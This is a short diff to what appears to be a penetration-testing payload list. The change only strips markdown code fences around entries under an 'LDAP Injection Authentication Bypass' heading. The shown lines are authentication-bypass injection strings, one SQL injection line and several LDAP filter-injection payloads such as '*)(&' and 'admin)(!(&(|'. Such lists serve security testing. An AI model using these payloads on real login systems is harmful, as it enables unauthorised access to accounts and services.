@@ -17,7 +17,7 @@ admin' or '
 admin' or '1'='2```
 
 LDAP Injection Authentication Bypass:
-```*
+*
 *)(&
 *)(|(&
 pwd)
@@ -27,4 +27,4 @@ admin)(&)
 pwd
 admin)(!(&(|
 pwd))
-admin))(|(|```
+admin))(|(|
